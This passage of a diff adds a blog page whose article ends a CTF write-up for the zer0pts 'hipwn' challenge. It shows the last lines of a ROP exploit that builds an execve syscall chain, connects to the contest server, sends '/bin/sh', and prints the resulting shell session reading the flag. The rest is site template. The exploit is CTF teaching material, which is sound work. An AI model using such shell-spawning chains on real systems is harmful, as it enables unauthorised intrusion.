+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>writable_readable_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#p = process("./chall")</span>
+p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">"18.179.178.246"</span><span class="token punctuation">,</span> <span class="token number">9010</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"?\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Sending this to stdin which means the `writable_readable_addr` will have `/bin/sh`</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>Running the exploit:-</p>
+<pre class=" language-r"><code class="language-r">robin<span class="token operator">@</span>oracle<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>CTFs<span class="token operator">$</span> python hipwn_xpl.py 
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/robin/CTFs/chall'</span>
+    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
+    RELRO<span class="token operator">:</span>    Partial RELRO
+    Stack<span class="token operator">:</span>    No canary found
+    NX<span class="token operator">:</span>       NX enabled
+    PIE<span class="token operator">:</span>      No PIE <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Opening connection to <span class="token number">18.179</span>.<span class="token number">178.246</span> on port <span class="token number">9010</span><span class="token operator">:</span> Done
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode
+<span class="token operator">$</span> ls
+chall
+flag.txt
+redir.sh
+<span class="token operator">$</span> cat flag.txt
+zer0pts<span class="token punctuation">{</span>welcome_yokoso_osooseyo_huanying_dobropozhalovat<span class="token punctuation">}</span>
+<span class="token operator">$</span>  </code></pre>
+<p>Yay, we got this. I hope you learned something. Encontered any issues? Contact <a href="https://twitter.com/D4mianWayne" target="_blank" rel="noopener">@D4mianWayne</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://d4mianwayne.github.io" rel="external nofollow noreferrer">D4mianWayne</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://d4mianwayne.github.io/1970/01/01/zer0pts-hipwn/">https://d4mianwayne.github.io/1970/01/01/zer0pts-hipwn/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="https://d4mianwayne.github.io" target="_blank">D4mianWayne</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban,twitter" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2018/09/13/fmt-bof/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Binary Exploitation - Format String + Buffer Overflow Vulnerability">
+                        
+                        <span class="card-title">Binary Exploitation - Format String + Buffer Overflow Vulnerability</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2018-09-12
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Binary-Exploitation/" class="post-category">
+                                    Binary Exploitation
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn-fmtstr-bof/">
+                        <span class="chip bg-color">pwn, fmtstr, bof</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/1970/01/01/ret2csu/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="ret2csu - A Return Oriented Programming Technique">
+                        
+                        <span class="card-title">ret2csu - A Return Oriented Programming Technique</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            This is an in-depth guide on ret2csu technique. I tried to make this article as much detailed as I could, including refe
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>1970-01-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            D4mianWayne
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="https://d4mianwayne.github.io" target="_blank">D4mianWayne</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Word Count:&nbsp;<span
+                class="white-color">25.7k</span>&nbsp;words
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;Total Visits:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;times
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;Total number of visitors:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;people
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">Loading Runtime....</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "09";
+                    var startDate = "20";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "This site has been safely operated " + diffDays + " days " + diffHours +
+                            " hours " + diffMinutes + " minutes " + diffSeconds + " seconds";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "This site has been safely operated " + diffYears + " years " + diffDays +
+                            " days " + diffHours + " hours " + diffMinutes + " minutes " + diffSeconds + " seconds";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/D4mianWayne" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:dubeyayushmanrobin@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+    
+    <script type="text/javascript" size="150" alpha='0.6'
+        zIndex="-1" src="/libs/background/ribbon-refresh.min.js" async="async"></script>
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
